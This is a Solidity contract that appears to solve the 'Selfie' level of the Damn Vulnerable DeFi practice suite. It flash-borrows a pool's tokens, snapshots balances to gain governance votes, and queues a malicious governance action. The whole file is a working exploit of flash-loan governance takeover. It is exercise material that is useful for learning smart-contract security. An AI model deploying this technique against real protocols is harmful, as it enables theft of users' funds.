// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract SelfieAttacker {
    SelfiePool immutable i_pool;
    DamnValuableTokenSnapshot immutable i_token;
    ISimpleGovernance immutable i_governance;

    constructor(address pool, address token, address governance) {
        i_pool = SelfiePool(pool);
        i_token = DamnValuableTokenSnapshot(token);
        i_governance = ISimpleGovernance(governance);
    }

    function attack(bytes memory data) external {
        console.log("Flashloan started ", i_token.balanceOf(address(this)));
        i_pool.flashLoan(
            IERC3156FlashBorrower(address(this)), address(i_token), i_token.balanceOf(address(i_pool)), "0x"
        );
        console.log("Flashloan executed ", i_token.balanceOf(address(this)));
        i_governance.queueAction(address(i_pool), 0, data);
    }

    function onFlashLoan(address pool, address token, uint256 amount, uint256, bytes memory)
        external
        returns (bytes32)
    {
        i_token.snapshot();
        console.log("Snapshot taken");
        i_token.approve(address(i_pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
